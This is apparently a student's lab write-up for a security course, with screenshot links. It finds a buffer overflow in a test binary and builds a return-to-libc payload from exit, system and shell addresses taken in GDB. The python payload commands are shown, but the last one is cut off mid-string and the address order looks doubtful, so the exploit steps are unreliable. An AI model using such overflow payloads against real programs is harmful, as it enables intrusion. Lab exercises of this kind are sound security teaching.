**AT THE BOTTOM OF THIS DOCUMENT ARE SCREENSHOTS WHICH SHOW MY STUDENT ID/PROOF THAT THESE ARE MY SCREENSHOTS AND NO ONE ELSE'S**

**Question 1**
![[Pasted image 20240131132855.png]]

--------------------------------------

**Question 2**
![](Pasted%20image%2020240202142549%201.png)
Here you can see at `54` 'A' characters, a segmentation fault occurs. Lower than `54`, like `53`, should be fine.

-------------------

**Question 3**
*Grabbing the exit, system, and shell hex values from GDB*
![](Pasted%20image%2020240202150653%201.png)
exit : 0xf7c3c130 (\\x30\\xc1\\xc3\\xf7)
system: 0xf7c4c830 (\\x30\\xc8\\xc4\\xf7)
shell : 0xffffd521 + 6 = 0xffffd527 (\\x27\\xd5\\xff\\xff)

exit + system + shell (all in little endian) = payload
"\\x30\\xc1\\xc3\\xf7" + "\\x30\\xc8\\xc4\\xf7" + "\\x27\\xd5\\xff\\xff" = payload

r `python -c 'print("\x30\xc1\xc3\xf7"+"\x30\xc8\xc4\xf7"+"\x27\xd5\xff\xff")'`

*Tried to run payload in gdb, but realized it was incorrect*
![](Pasted%20image%2020240202153813%201.png)

*Passing the payload by value with pipe*
![](Pasted%20image%2020240202153704%201.png)
I print the NOP buffer 50 times, followed by the exit address, then the system address, then the modified shell address (+6 to original address), and piped it into `example3.out` to get the segmentation fault. 

```
python2 -c 'print"\x90"*50+"\x30\xc1\xc3\xf7"+"\x30\xc8\xc4\xf7"+"\x" | ./example3.out
```

*Both Executions (with Payload, without Payload)*
![](Pasted%20image%2020240202154908%201.png)


**Instead of going back and taking all the screenshots again, I took a large screenshot with the commands I used, and at the top of the terminal, you can see the tabs I created for which shows/proves that these are my own commands and no one else's.**

------------------------
![](Pasted%20image%2020240205131321.png)![](Pasted%20image%2020240205131526.png)
![](Pasted%20image%2020240205131554.png)
